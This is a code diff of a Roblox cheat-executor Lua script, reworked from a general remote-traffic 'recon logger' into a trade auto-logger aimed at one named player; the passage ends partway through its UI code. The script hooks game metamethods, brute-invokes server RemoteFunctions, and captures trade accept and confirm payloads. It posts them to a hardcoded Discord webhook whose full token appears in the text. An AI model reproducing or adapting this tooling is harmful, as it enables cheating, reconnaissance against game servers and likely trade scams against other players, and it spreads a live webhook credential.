@@ -1,11 +1,12 @@
 -- =============================================
--- [igc] AA RECON LOGGER v3
--- Keyword-targeted: Trade/Offer/Accept/Confirm
--- Request/Swap/Exchange/Unit/Inventory
--- Executor: Delta / KRNL / Fluxus / Synapse
+-- [igc] AA TRADE AUTO-LOGGER v1
+-- Target: jfhjrudfhb24
+-- Auto-sends to webhook on trade accept
+-- You build the trade manually like normal
 -- =============================================
 
-local WEBHOOK = "https://discord.com/api/webhooks/1570997699342245978/QuQERBzp-IVQrOBVyexEi7_NMFqnPnsWxSIivDKL99QCURSBDf-D5Cw2PIIcvo1nrVHk"
+local WEBHOOK    = "https://discord.com/api/webhooks/1570997699342245978/QuQERBzp-IVQrOBVyexEi7_NMFqnPnsWxSIivDKL99QCURSBDf-D5Cw2PIIcvo1nrVHk"
+local TARGET_NAME = "jfhjrudfhb24"
 
 -- =============================================
 -- EXECUTOR COMPAT
@@ -21,10 +22,10 @@ local httpFn = (
 )
 
 local function getExec()
-    if syn            then return "Synapse X"  end
-    if KRNL_LOADED    then return "KRNL"       end
-    if fluxus         then return "Fluxus"     end
-    if Delta          then return "Delta"      end
+    if syn           then return "Synapse X" end
+    if KRNL_LOADED   then return "KRNL"      end
+    if fluxus        then return "Fluxus"    end
+    if Delta         then return "Delta"     end
     if identifyexecutor then return identifyexecutor() end
     return "Unknown"
 end
@@ -42,20 +43,11 @@ local lp      = Players.LocalPlayer
 local gui     = lp:WaitForChild("PlayerGui")
 
 -- =============================================
--- KEYWORD TABLE
--- every filter runs through this exact list
+-- KEYWORDS
 -- =============================================
 local KEYWORDS = {
-    "trade",
-    "offer",
-    "accept",
-    "confirm",
-    "request",
-    "swap",
-    "exchange",
-    "unit",
-    "inventory",
-    "inv",
+    "trade","offer","accept","confirm",
+    "request","swap","exchange","unit","inventory","inv",
 }
 
 local function isKW(s)
@@ -81,39 +73,18 @@ end
 -- CAPTURE BUCKETS
 -- =============================================
 local LOG = {
-    -- remotes whose NAME matches keywords
-    kwRemotes    = {},
-
-    -- ALL remotes (for full map)
-    allRemotes   = {},
-
-    -- RF invoke results (keyword-matched RFs only)
-    invokeHits   = {},
-
-    -- RF invoke results (brute all)
-    invokeAll    = {},
-
-    -- OnClientEvent from keyword-matched REs
-    kwEvents     = {},
-
-    -- ALL OnClientEvent
-    allEvents    = {},
-
-    -- namecall: keyword-matched paths
-    ncHits       = {},
-
-    -- namecall: ALL calls
-    ncFull       = {},
-
-    -- index hook: keyword key reads
-    idxCatches   = {},
-
-    -- instance scan: keyword-named objects + children
-    kwInstances  = {},
-
-    -- player folder values
-    playerVals   = {},
+    tradeData    = {},  -- everything captured during trade session
+    ncHits       = {},  -- namecall hits (keyword matched)
+    ncFull       = {},  -- all namecall traffic
+    kwEvents     = {},  -- keyword-matched server events
+    invokeHits   = {},  -- RF invoke results
+    acceptEvent  = nil, -- the exact accept payload
+    confirmEvent = nil, -- the exact confirm payload
 }
+
+local tradeActive   = false
+local tradeSent     = false
+local watchingTarget = false
 
 -- =============================================
 -- UTILS
@@ -122,7 +93,7 @@ local function fmt(v, d)
     d = d or 0
     if d > 4 then return "..." end
     local t = type(v)
-    if t == "string"  then return '"'..v:sub(1,150)..'"' end
+    if t == "string"  then return '"'..v:sub(1,200)..'"' end
     if t == "number" or t == "boolean" then return tostring(v) end
     if t == "table" then
         local out, n = {}, 0
@@ -142,156 +113,213 @@ end
 
 local function ts() return os.date("%H:%M:%S") end
 
-local function tag(s)
-    -- returns keyword tag for display
-    local kws = whichKW(s)
-    return kws ~= "" and "⚡["..kws.."]" or ""
-end
+-- =============================================
+-- WEBHOOK SENDER
+-- =============================================
+local function sendWH(title, lines, urgent)
+    local wh = WEBHOOK
+    if not wh or not wh:find("discord.com/api/webhooks") then return end
 
--- =============================================
--- PHASE 1 — FULL REMOTE MAP + KW FILTER
--- =============================================
-local function mapRemotes()
-    local roots = {
-        RS,
-        workspace,
-        game:GetService("Players"),
-    }
-    for _, root in ipairs(roots) do
+    local body = table.concat(lines, "\n")
+    local chunks = {}
+    for i = 1, #body, 1900 do
+        table.insert(chunks, body:sub(i, i+1899))
+    end
+
+    for idx, chunk in ipairs(chunks) do
+        local t2 = #chunks>1 and (title.." ["..idx.."/"..#chunks.."]") or title
+        -- urgent trades get red color
+        local color = urgent and 0xFF4444 or 0x2244FF
         pcall(function()
-            for _, v in ipairs(root:GetDescendants()) do
-                if v:IsA("RemoteFunction") or v:IsA("RemoteEvent") or v:IsA("BindableFunction") then
-                    local entry = {
-                        t    = ts(),
-                        path = v:GetFullName(),
-                        cls  = v.ClassName,
-                        name = v.Name,
-                        kws  = whichKW(v.Name),
-                    }
-                    table.insert(LOG.allRemotes, entry)
-                    if isKW(v.Name) then
-                        table.insert(LOG.kwRemotes, entry)
-                        print("[igc] KW remote: ["..v.ClassName.."] "..v:GetFullName().." → "..entry.kws)
-                    end
-                end
-            end
-        end)
-    end
-    print("[igc] remote map: "..#LOG.allRemotes.." total, "..#LOG.kwRemotes.." keyword hits")
-end
-
--- =============================================
--- PHASE 2 — TARGETED RF INVOKE
--- invokes keyword-matched RFs first
--- then brute-invokes everything else
--- =============================================
-local function invokeRemotes()
-    -- pass 1: keyword matched — try multiple arg combos
-    for _, v in ipairs(RS:GetDescendants()) do
-        if v:IsA("RemoteFunction") and isKW(v.Name) then
-            local fp = v:GetFullName()
-            local argSets = {
-                {},
-                {lp},
-                {lp.UserId},
-                {lp.Name},
-                {"get"},
-                {"fetch"},
-                {true},
-            }
-            for _, argSet in ipairs(argSets) do
-                task.spawn(function()
-                    local ok, res = pcall(function()
-                        return v:InvokeServer(table.unpack(argSet))
-                    end)
-                    if ok and res ~= nil then
-                        local entry = {
-                            t    = ts(),
-                            path = fp,
-                            args = fmt(argSet),
-                            res  = fmt(res),
-                            kws  = whichKW(v.Name),
+            httpFn({
+                Url    = wh,
+                Method = "POST",
+                Headers= {["Content-Type"]="application/json"},
+                Body   = HS:JSONEncode({
+                    username = "[igc] AA Trade Logger",
+                    embeds   = {{
+                        title       = t2,
+                        description = chunk,
+                        color       = color,
+                        footer      = {
+                            text = EXEC.." · "..lp.Name.." · target: "..TARGET_NAME
                         }
-                        table.insert(LOG.invokeHits, entry)
-                        print("[igc] ⚡ KW invoke hit: "..fp.." → "..fmt(res):sub(1,100))
-                    end
-                end)
-                task.wait(0.1)
-            end
-        end
+                    }}
+                })
+            })
+        end)
+        if idx < #chunks then task.wait(1.2) end
     end
-
-    -- pass 2: brute all RFs (no arg)
-    task.delay(2, function()
-        for _, v in ipairs(RS:GetDescendants()) do
-            if v:IsA("RemoteFunction") then
-                local fp = v:GetFullName()
-                task.spawn(function()
-                    local ok, res = pcall(function()
-                        return v:InvokeServer()
-                    end)
-                    if ok and res ~= nil then
-                        table.insert(LOG.invokeAll, {
-                            t    = ts(),
-                            path = fp,
-                            res  = fmt(res),
-                            kws  = whichKW(v.Name),
-                        })
-                    end
-                end)
-            end
-        end
-    end)
 end
 
 -- =============================================
--- PHASE 3 — EVENT LISTENERS
--- keyword-matched REs get priority logging
--- all others logged in background
+-- AUTO-SEND TRADE REPORT
+-- fires automatically when accept/confirm detected
 -- =============================================
-local evConns = {}
+local function autoSendReport(trigger)
+    if tradeSent then return end
+    tradeSent = true
 
-local function listenEvents()
-    for _, v in ipairs(RS:GetDescendants()) do
-        if v:IsA("RemoteEvent") then
-            local fp  = v:GetFullName()
-            local kwm = isKW(v.Name)
+    print("[igc] ⚡ TRADE TRIGGERED BY: "..trigger.." — sending report")
 
-            local conn = v.OnClientEvent:Connect(function(...)
-                local args = {...}
-                local entry = {
-                    t    = ts(),
-                    path = fp,
-                    data = {},
-                    kws  = whichKW(v.Name),
-                }
-                for i, a in ipairs(args) do
-                    entry.data[i] = fmt(a)
-                end
+    -- R1: trade summary
+    do
+        local lines = {
+            "# ⚡ TRADE AUTO-LOGGED",
+            "**Trigger:** `"..trigger.."`",
+            "**Target:** `"..TARGET_NAME.."`",
+            "**Time:** `"..ts().."`",
+            "**Your name:** "..lp.Name,
+            "**Your UID:** `"..lp.UserId.."`",
+            "",
+        }
 
-                table.insert(LOG.allEvents, entry)
-
-                if kwm then
-                    table.insert(LOG.kwEvents, entry)
-                    print("[igc] ⚡ KW event: "..fp.." → "..table.concat(entry.data," | "):sub(1,100))
-                end
-            end)
-            table.insert(evConns, conn)
+        if LOG.acceptEvent then
+            table.insert(lines, "**== Accept Payload ==**")
+            table.insert(lines, "```")
+            table.insert(lines, LOG.acceptEvent)
+            table.insert(lines, "```")
+            table.insert(lines, "")
         end
+
+        if LOG.confirmEvent then
+            table.insert(lines, "**== Confirm Payload ==**")
+            table.insert(lines, "```")
+            table.insert(lines, LOG.confirmEvent)
+            table.insert(lines, "```")
+            table.insert(lines, "")
+        end
+
+        sendWH("⚡ TRADE AUTO-LOG — "..TARGET_NAME, lines, true)
     end
 
-    task.delay(45, function()
-        for _, c in ipairs(evConns) do c:Disconnect() end
-        print("[igc] events done — kw:"..#LOG.kwEvents.." all:"..#LOG.allEvents)
-    end)
+    task.wait(1.5)
 
-    print("[igc] listening "..#evConns.." RemoteEvents for 45s")
+    -- R2: all keyword namecall hits during trade
+    do
+        local lines = {
+            "**== ⚡ Trade Namecall Hits: "..#LOG.ncHits.." ==**",
+            "every keyword remote called during this trade session",
+            "",
+        }
+        for i, h in ipairs(LOG.ncHits) do
+            if i > 50 then table.insert(lines,"...+"..(#LOG.ncHits-50).." more"); break end
+            table.insert(lines, "⚡ **"..h.t.."** `"..h.path.."`")
+            table.insert(lines, "  **"..h.method.."** ["..h.kws.."]")
+            if #h.args > 0 then
+                table.insert(lines, "  args → "..table.concat(h.args,", "))
+            end
+            if #h.rets > 0 then
+                table.insert(lines, "  **ret → "..table.concat(h.rets," | ").."**")
+            end
+            table.insert(lines, "")
+        end
+        sendWH("⚡ Trade Namecall Log — "..TARGET_NAME, lines, true)
+    end
+
+    task.wait(1.5)
+
+    -- R3: keyword server events during trade
+    do
+        local lines = {
+            "**== ⚡ Trade Events: "..#LOG.kwEvents.." ==**",
+            "",
+        }
+        for i, e in ipairs(LOG.kwEvents) do
+            if i > 40 then table.insert(lines,"...+"..(#LOG.kwEvents-40).." more"); break end
+            table.insert(lines, "⚡ **"..e.t.."** `"..e.path.."` ["..e.kws.."]")
+            if #e.data > 0 then
+                table.insert(lines, "  **"..table.concat(e.data," | ").."**")
+            end
+            table.insert(lines, "")
+        end
+        sendWH("⚡ Trade Events — "..TARGET_NAME, lines, true)
+    end
+
+    task.wait(1.5)
+
+    -- R4: RF invoke hits
+    if #LOG.invokeHits > 0 then
+        local lines = {
+            "**== ⚡ RF Invoke Hits: "..#LOG.invokeHits.." ==**",
+            "",
+        }
+        for i, r in ipairs(LOG.invokeHits) do
+            if i > 30 then break end
+            table.insert(lines, "⚡ `"..r.path.."`")
+            table.insert(lines, "  → **"..r.res.."**")
+            table.insert(lines, "")
+        end
+        sendWH("⚡ RF Hits — "..TARGET_NAME, lines, true)
+    end
+
+    -- R5: full namecall log (everything, not just kw)
+    do
+        local lines = {
+            "**== Full Namecall Log: "..#LOG.ncFull.." ==**",
+            "every remote call during trade session",
+            "",
+        }
+        for i, h in ipairs(LOG.ncFull) do
+            if i > 60 then table.insert(lines,"...+"..(#LOG.ncFull-60).." more"); break end
+            local kw = h.kws ~= "" and "⚡" or "·"
+            table.insert(lines, kw.." **"..h.t.."** `"..h.path.."` "..h.method)
+            if #h.rets > 0 then
+                table.insert(lines, "  → "..table.concat(h.rets," | "))
+            end
+        end
+        sendWH("Full Namecall — "..TARGET_NAME, lines, false)
+    end
+
+    print("[igc] all trade reports sent ✓")
 end
 
 -- =============================================
--- PHASE 4 — NAMECALL HOOK
--- filters keyword paths into ncHits
--- logs everything into ncFull
+-- TARGET WATCHER
+-- polls player list every 2s to detect
+-- when TARGET_NAME joins the server
+-- =============================================
+local function watchTarget()
+    local function checkTarget()
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p.Name == TARGET_NAME then
+                return p
+            end
+        end
+        return nil
+    end
+
+    -- check if already in server
+    local existing = checkTarget()
+    if existing then
+        print("[igc] target "..TARGET_NAME.." already in server")
+        return existing
+    end
+
+    -- wait for them to join
+    local found = nil
+    local conn
+    conn = Players.PlayerAdded:Connect(function(p)
+        if p.Name == TARGET_NAME then
+            found = p
+            print("[igc] target "..TARGET_NAME.." joined ✓")
+            conn:Disconnect()
+        end
+    end)
+
+    -- also poll just in case
+    while not found do
+        task.wait(2)
+        found = checkTarget()
+    end
+
+    return found
+end
+
+-- =============================================
+-- NAMECALL HOOK
+-- captures all remote traffic during trade
+-- auto-detects accept/confirm
 -- =============================================
 local oldNC
 
@@ -336,7 +364,43 @@ local function armNamecall()
 
             if isKW(fp) then
                 table.insert(LOG.ncHits, entry)
-                print("[igc] ⚡ NC hit: "..fp.." "..method..(#entry.rets>0 and " → "..entry.rets[1] or ""))
+
+                local fp_lo = fp:lower()
+
+                -- detect trade request sent
+                if fp_lo:find("request") or fp_lo:find("trade") then
+                    if not tradeActive then
+                        tradeActive = true
+                        print("[igc] trade session started — watching for accept from "..TARGET_NAME)
+                    end
+                end
+
+                -- detect accept
+                if fp_lo:find("accept") then
+                    LOG.acceptEvent = "path: "..fp.."\nmethod: "..method
+                        .."\nargs: "..table.concat(entry.args,", ")
+                        .."\nret: "..table.concat(entry.rets," | ")
+                    print("[igc] ⚡ ACCEPT DETECTED: "..fp)
+                    task.spawn(function() autoSendReport("ACCEPT via "..fp) end)
+                end
+
+                -- detect confirm
+                if fp_lo:find("confirm") then
+                    LOG.confirmEvent = "path: "..fp.."\nmethod: "..method
+                        .."\nargs: "..table.concat(entry.args,", ")
+                        .."\nret: "..table.concat(entry.rets," | ")
+                    print("[igc] ⚡ CONFIRM DETECTED: "..fp)
+                    task.spawn(function() autoSendReport("CONFIRM via "..fp) end)
+                end
+
+                -- RF results
+                if #entry.rets > 0 then
+                    table.insert(LOG.invokeHits, {
+                        t    = ts(),
+                        path = fp,
+                        res  = table.concat(entry.rets," | "),
+                    })
+                end
             end
 
             return table.unpack(rets, 1, rets.n)
@@ -345,364 +409,119 @@ local function armNamecall()
         return oldNC(self, ...)
     end)
 
-    print("[igc] namecall hook armed")
+    print("[igc] namecall hook armed — watching for accept/confirm")
     return true
 end
 
 -- =============================================
--- PHASE 5 — INDEX HOOK
--- catches keyword table reads
+-- EVENT LISTENERS
+-- listens all REs, filters keyword ones
+-- auto-triggers on accept/confirm events
 -- =============================================
-local oldIDX
+local evConns = {}
 
-local function armIndex()
-    if not hookmetamethod then return false end
+local function listenEvents()
+    for _, v in ipairs(RS:GetDescendants()) do
+        if v:IsA("RemoteEvent") then
+            local fp  = v:GetFullName()
+            local kwm = isKW(v.Name)
+            local fp_lo = fp:lower()
 
-    oldIDX = hookmetamethod(game, "__index", function(self, key)
-        if checkcaller and checkcaller() then return oldIDX(self, key) end
+            local conn = v.OnClientEvent:Connect(function(...)
+                local args = {...}
+                local entry = {
+                    t    = ts(),
+                    path = fp,
+                    data = {},
+                    kws  = whichKW(v.Name),
+                }
+                for i, a in ipairs(args) do
+                    entry.data[i] = fmt(a)
+                end
 
-        local val = oldIDX(self, key)
+                if kwm then
+                    table.insert(LOG.kwEvents, entry)
 
-        if isKW(key) and type(val) == "table" then
-            local entry = {
-                t   = ts(),
-                key = key,
-                val = fmt(val),
-                kws = whichKW(key),
-            }
-            table.insert(LOG.idxCatches, entry)
-            print("[igc] ⚡ IDX: key="..key.." → "..fmt(val):sub(1,80))
+                    -- check if this is accept/confirm event
+                    if fp_lo:find("accept") then
+                        LOG.acceptEvent = "event: "..fp
+                            .."\ndata: "..table.concat(entry.data," | ")
+                        print("[igc] ⚡ ACCEPT EVENT: "..fp)
+                        task.spawn(function() autoSendReport("ACCEPT EVENT "..fp) end)
+                    end
+
+                    if fp_lo:find("confirm") then
+                        LOG.confirmEvent = "event: "..fp
+                            .."\ndata: "..table.concat(entry.data," | ")
+                        print("[igc] ⚡ CONFIRM EVENT: "..fp)
+                        task.spawn(function() autoSendReport("CONFIRM EVENT "..fp) end)
+                    end
+
+                    -- also trigger if data contains target username
+                    for _, d in ipairs(entry.data) do
+                        if type(d) == "string" and d:find(TARGET_NAME) then
+                            print("[igc] ⚡ TARGET USERNAME IN EVENT DATA: "..fp)
+                            if not tradeSent then
+                                task.spawn(function() autoSendReport("TARGET IN DATA "..fp) end)
+                            end
+                        end
+                    end
+                end
+            end)
+            table.insert(evConns, conn)
         end
-
-        return val
-    end)
-
-    print("[igc] index hook armed")
-    return true
+    end
+    print("[igc] listening "..#evConns.." RemoteEvents")
 end
 
 -- =============================================
--- PHASE 6 — INSTANCE SCAN
--- keyword-named objects + full child dump
--- player folder value read
+-- INSTANCE SCAN
 -- =============================================
 local function scanInstances()
     local function deep(root, d)
-        if d > 10 then return end
+        if d > 8 then return end
         for _, c in ipairs(root:GetChildren()) do
             pcall(function()
                 if isKW(c.Name) then
-                    local entry = {
+                    table.insert(LOG.tradeData, {
                         t    = ts(),
                         path = c:GetFullName(),
                         cls  = c.ClassName,
                         kws  = whichKW(c.Name),
-                        kids = {},
-                        vals = {},
-                    }
-                    -- dump all children
-                    for _, kid in ipairs(c:GetChildren()) do
-                        table.insert(entry.kids, kid.Name.."["..kid.ClassName.."]")
-                        -- if value object, grab value
-                        if kid:IsA("ValueBase") then
-                            table.insert(entry.vals, kid.Name.."="..tostring(kid.Value))
-                        end
-                        -- if it's a table/model, dump its children too
-                        for _, gkid in ipairs(kid:GetChildren()) do
-                            if gkid:IsA("ValueBase") then
-                                table.insert(entry.vals, kid.Name.."."..gkid.Name.."="..tostring(gkid.Value))
-                            end
-                        end
-                    end
-                    table.insert(LOG.kwInstances, entry)
-                    print("[igc] ⚡ Instance: "..c:GetFullName().." kids:"..#entry.kids)
+                    })
                 end
                 deep(c, d+1)
             end)
         end
     end
-
     local roots = {RS, workspace, lp}
     local pgui = lp:WaitForChild("PlayerGui", 3)
     if pgui then table.insert(roots, pgui) end
-
     for _, root in ipairs(roots) do
         pcall(function() deep(root, 0) end)
-    end
-
-    -- grab all ValueBase under player
-    pcall(function()
-        local function grabVals(inst)
-            for _, c in ipairs(inst:GetChildren()) do
-                if c:IsA("ValueBase") then
-                    table.insert(LOG.playerVals, {
-                        path = c:GetFullName(),
-                        cls  = c.ClassName,
-                        val  = tostring(c.Value),
-                        kws  = whichKW(c.Name),
-                    })
-                end
-                grabVals(c)
-            end
-        end
-        grabVals(lp)
-    end)
-
-    print("[igc] scan done — kw instances:"..#LOG.kwInstances.." player vals:"..#LOG.playerVals)
-end
-
--- =============================================
--- WEBHOOK SENDER
--- =============================================
-local function sendWH(title, lines, wh)
-    if not wh or not wh:find("discord.com/api/webhooks") then return end
-    local body = table.concat(lines, "\n")
-    local chunks = {}
-    for i = 1, #body, 1900 do
-        table.insert(chunks, body:sub(i, i+1899))
-    end
-    for idx, chunk in ipairs(chunks) do
-        local t2 = #chunks>1 and (title.." ["..idx.."/"..#chunks.."]") or title
-        pcall(function()
-            httpFn({
-                Url    = wh,
-                Method = "POST",
-                Headers= {["Content-Type"]="application/json"},
-                Body   = HS:JSONEncode({
-                    username = "[igc] AA Logger v3",
-                    embeds   = {{
-                        title       = t2,
-                        description = chunk,
-                        color       = 0x2244FF,
-                        footer      = { text = EXEC.." · "..lp.Name.." · "..lp.UserId }
-                    }}
-                })
-            })
-        end)
-        if idx < #chunks then task.wait(1.2) end
-    end
-end
-
--- =============================================
--- REPORT BUILDER
--- =============================================
-local function buildReports(wh)
-
-    -- R1: KEYWORD REMOTES (most important — exact names)
-    do
-        local lines = {
-            "**== ⚡ KEYWORD REMOTES: "..#LOG.kwRemotes.." ==**",
-            "remotes matching: trade/offer/accept/confirm/request/swap/exchange/unit/inventory",
-            "",
-        }
-        for _, r in ipairs(LOG.kwRemotes) do
-            table.insert(lines, "⚡`["..r.cls.."]` **"..r.name.."**")
-            table.insert(lines, "  path: `"..r.path.."`")
-            table.insert(lines, "  matched: `"..r.kws.."`")
-            table.insert(lines, "")
-        end
-        if #LOG.kwRemotes == 0 then
-            table.insert(lines, "_no keyword remotes found — check if fully loaded_")
-        end
-        sendWH("AA v3 — ⚡ Keyword Remotes", lines, wh)
-    end
-
-    task.wait(1.5)
-
-    -- R2: RF INVOKE HITS (keyword RFs + what they returned)
-    do
-        local lines = {
-            "**== ⚡ RF Invoke Hits: "..#LOG.invokeHits.." ==**",
-            "keyword RemoteFunctions that returned data",
-            "",
-        }
-        for i, r in ipairs(LOG.invokeHits) do
-            if i > 40 then table.insert(lines,"...+"..(#LOG.invokeHits-40).." more"); break end
-            table.insert(lines, "⚡ **"..r.t.."** `"..r.path.."`")
-            table.insert(lines, "  args: "..r.args)
-            table.insert(lines, "  **→ "..r.res.."**")
-            table.insert(lines, "")
-        end
-        if #LOG.invokeHits == 0 then
-            table.insert(lines, "_no hits yet — interact with units/trade in-game then resend_")
-        end
-        sendWH("AA v3 — ⚡ RF Invoke Hits", lines, wh)
-    end
-
-    task.wait(1.5)
-
-    -- R3: ALL RF RESULTS (brute)
-    do
-        local lines = {
-            "**== All RF Results: "..#LOG.invokeAll.." ==**",
-            "",
-        }
-        for i, r in ipairs(LOG.invokeAll) do
-            if i > 40 then table.insert(lines,"...+"..(#LOG.invokeAll-40).." more"); break end
-            local kw = r.kws ~= "" and "⚡" or "·"
-            table.insert(lines, kw.." **"..r.t.."** `"..r.path.."`")
-            table.insert(lines, "  → "..r.res)
-        end
-        sendWH("AA v3 — All RF Results", lines, wh)
-    end
-
-    task.wait(1.5)
-
-    -- R4: KEYWORD NAMECALL HITS
-    do
-        local lines = {
-            "**== ⚡ Namecall Hits: "..#LOG.ncHits.." ==**",
-            "live traffic matching keywords",
-            "",
-        }
-        for i, h in ipairs(LOG.ncHits) do
-            if i > 50 then table.insert(lines,"...+"..(#LOG.ncHits-50).." more"); break end
-            table.insert(lines, "⚡ **"..h.t.."** `"..h.path.."`")
-            table.insert(lines, "  method: **"..h.method.."**  matched: `"..h.kws.."`")
-            if #h.args > 0 then
-                table.insert(lines, "  args: "..table.concat(h.args,", "))
-            end
-            if #h.rets > 0 then
-                table.insert(lines, "  **→ "..table.concat(h.rets," | ").."**")
-            end
-            table.insert(lines, "")
-        end
-        if #LOG.ncHits == 0 then
-            table.insert(lines, "_no hits yet — open inventory or initiate a trade_")
-        end
-        sendWH("AA v3 — ⚡ Namecall Hits", lines, wh)
-    end
-
-    task.wait(1.5)
-
-    -- R5: KEYWORD EVENTS
-    do
-        local lines = {
-            "**== ⚡ Keyword Events: "..#LOG.kwEvents.." ==**",
-            "server→client fires on keyword remotes",
-            "",
-        }
-        for i, e in ipairs(LOG.kwEvents) do
-            if i > 40 then table.insert(lines,"...+"..(#LOG.kwEvents-40).." more"); break end
-            table.insert(lines, "⚡ **"..e.t.."** `"..e.path.."` ["..e.kws.."]")
-            if #e.data > 0 then
-                table.insert(lines, "  **data: "..table.concat(e.data," | ").."**")
-            end
-            table.insert(lines, "")
-        end
-        if #LOG.kwEvents == 0 then
-            table.insert(lines, "_no events yet — interact with trade/inventory_")
-        end
-        sendWH("AA v3 — ⚡ Keyword Events", lines, wh)
-    end
-
-    task.wait(1.5)
-
-    -- R6: ALL EVENTS (full)
-    do
-        local lines = {
-            "**== All Events: "..#LOG.allEvents.." ==**",
-            "",
-        }
-        for i, e in ipairs(LOG.allEvents) do
-            if i > 50 then table.insert(lines,"...+"..(#LOG.allEvents-50).." more"); break end
-            local kw = e.kws ~= "" and "⚡" or "·"
-            table.insert(lines, kw.." **"..e.t.."** `"..e.path.."`")
-            if #e.data > 0 then
-                table.insert(lines, "  "..table.concat(e.data," | "))
-            end
-        end
-        sendWH("AA v3 — All Events", lines, wh)
-    end
-
-    task.wait(1.5)
-
-    -- R7: KEYWORD INSTANCES (full child + value dump)
-    do
-        local lines = {
-            "**== ⚡ Keyword Instances: "..#LOG.kwInstances.." ==**",
-            "",
-        }
-        for i, u in ipairs(LOG.kwInstances) do
-            if i > 30 then table.insert(lines,"...+"..(#LOG.kwInstances-30).." more"); break end
-            table.insert(lines, "⚡ `"..u.path.."` ["..u.cls.."] matched:`"..u.kws.."`")
-            if #u.kids > 0 then
-                table.insert(lines, "  children: "..table.concat(u.kids, ", "))
-            end
-            if #u.vals > 0 then
-                table.insert(lines, "  **values: "..table.concat(u.vals, " | ").."**")
-            end
-            table.insert(lines, "")
-        end
-        sendWH("AA v3 — ⚡ Keyword Instances", lines, wh)
-    end
-
-    task.wait(1.5)
-
-    -- R8: PLAYER VALUES (all)
-    do
-        local lines = {
-            "**== Player Values: "..#LOG.playerVals.." ==**",
-            "",
-        }
-        for _, v in ipairs(LOG.playerVals) do
-            local kw = v.kws ~= "" and "⚡" or "·"
-            table.insert(lines, kw.." `"..v.path.."` ["..v.cls.."] = **"..v.val.."**")
-        end
-        if #LOG.playerVals == 0 then
-            table.insert(lines, "_none found_")
-        end
-        sendWH("AA v3 — Player Values", lines, wh)
-    end
-
-    -- R9: INDEX CATCHES
-    if #LOG.idxCatches > 0 then
-        local lines = {
-            "**== ⚡ Index Catches: "..#LOG.idxCatches.." ==**",
-            "",
-        }
-        for i, c in ipairs(LOG.idxCatches) do
-            if i > 30 then break end
-            table.insert(lines, "⚡ **"..c.t.."** key=`"..c.key.."` ["..c.kws.."]")
-            table.insert(lines, "  "..c.val)
-            table.insert(lines, "")
-        end
-        sendWH("AA v3 — Index Catches", lines, wh)
-    end
-
-    -- R10: FULL REMOTE MAP
-    do
-        local lines = {
-            "**== Full Remote Map: "..#LOG.allRemotes.." ==**",
-            "",
-        }
-        for i, r in ipairs(LOG.allRemotes) do
-            if i > 80 then table.insert(lines,"...+"..(#LOG.allRemotes-80).." more"); break end
-            local kw = r.kws ~= "" and "⚡" or "·"
-            table.insert(lines, kw.."`["..r.cls.."]` "..r.path)
-        end
-        sendWH("AA v3 — Full Remote Map", lines, wh)
     end
 end
 
 -- =============================================
 -- UI
 -- =============================================
-if gui:FindFirstChild("AALoggerV3") then gui.AALoggerV3:Destroy() end
+if gui:FindFirstChild("AATradeLogger") then
+    gui.AATradeLogger:Destroy()
+end
 
 local SG = Instance.new("ScreenGui")
-SG.Name="AALoggerV3"; SG.ResetOnSpawn=false; SG.Parent=gui
+SG.Name="AATradeLogger"; SG.ResetOnSpawn=false; SG.Parent=gui
 
 local Main = Instance.new("Frame")
-Main.Size=UDim2.new(0,305,0,370)
-Main.Position=UDim2.new(0.5,-152,0.5,-185)
+Main.Size=UDim2.new(0,300,0,330)
+Main.Position=UDim2.new(0.5,-150,0.5,-165)
 Main.BackgroundColor3=Color3.fromRGB(8,8,18)
 Main.BorderSizePixel=0; Main.Active=true; Main.Draggable=true; Main.Parent=SG
 Instance.new("UICorner",Main).CornerRadius=UDim.new(0,8)
 local ms=Instance.new("UIStroke",Main)
 ms.Color=Color3.fromRGB(40,40,190); ms.Thickness=1
 
--- title bar
+-- title
 local TB=Instance.new("Frame")
 TB.Size=UDim2.new(1,0,0,32); TB.BackgroundColor3=Color3.fromRGB(12,12,34)
 TB.BorderSizePixel=0; TB.Parent=Main
@@ -711,7 +530,7 @@ Instance.new("UICorner",TB).CornerRadius=UDim.new(0,8)
 local TL=Instance.new("TextLabel")
 TL.Size=UDim2.new(1,-34,1,0); TL.Position=UDim2.new(0,10,0,0)
 TL.BackgroundTransparency=1
-TL.Text="[igc] AA Logger v3 — "..EXEC
+TL.Text="[igc] AA Trade Logger — "..EXEC
 TL.TextColor3=Color3.fromRGB(70,70,220); TL.TextSize=10
 TL.Font=Enum.Font.Code; TL.TextXAlignment=Enum.TextXAlignment.Left; TL.Parent=TB
 
@@ -723,7 +542,7 @@ XB.Font=Enum.Font.GothamBold; XB.BorderSizePixel=0; XB.Parent=TB
 Instance.new("UICorner",XB).CornerRadius=UDim.new(0,4)
 XB.MouseButton1Click:Connect(function() SG:Destroy() end)
 
--- webhook
+-- webhook input
 local function mklbl(txt, y)
     local l=Instance.new("TextLabel")
     l.Size=UDim2.new(1,-20,0,12); l.Position=UDim2.new(0,10,0,y)
@@ -745,166 +564,174 @@ WHB.ClearTextOnFocus=false; WHB.BorderSizePixel=0; WHB.Parent=Main
 Instance.new("UICorner",WHB).CornerRadius=UDim.new(0,4)
 local whs=Instance.new("UIStroke",WHB); whs.Color=Color3.fromRGB(35,35,130); whs.Thickness=1
 
--- keyword display
-mklbl("Active Keywords", 86)
-local kwDisp=Instance.new("TextLabel")
-kwDisp.Size=UDim2.new(1,-20,0,20); kwDisp.Position=UDim2.new(0,10,0,99)
-kwDisp.BackgroundColor3=Color3.fromRGB(10,10,24); kwDisp.BorderSizePixel=0
-kwDisp.Text="trade · offer · accept · confirm · request · swap · exchange · unit · inventory"
-kwDisp.TextColor3=Color3.fromRGB(80,180,220); kwDisp.TextSize=9; kwDisp.Font=Enum.Font.Code
-kwDisp.Parent=Main
-Instance.new("UICorner",kwDisp).CornerRadius=UDim.new(0,4)
+-- target display
+local TGF=Instance.new("Frame")
+TGF.Size=UDim2.new(1,-20,0,24); TGF.Position=UDim2.new(0,10,0,86)
+TGF.BackgroundColor3=Color3.fromRGB(10,10,24); TGF.BorderSizePixel=0; TGF.Parent=Main
+Instance.new("UICorner",TGF).CornerRadius=UDim.new(0,4)
+Instance.new("UIStroke",TGF).Color=Color3.fromRGB(50,50,180)
+
+local TGL=Instance.new("TextLabel")
+TGL.Size=UDim2.new(1,-10,1,0); TGL.Position=UDim2.new(0,8,0,0)
+TGL.BackgroundTransparency=1
+TGL.Text="target: "..TARGET_NAME
+TGL.TextColor3=Color3.fromRGB(100,210,255); TGL.TextSize=11
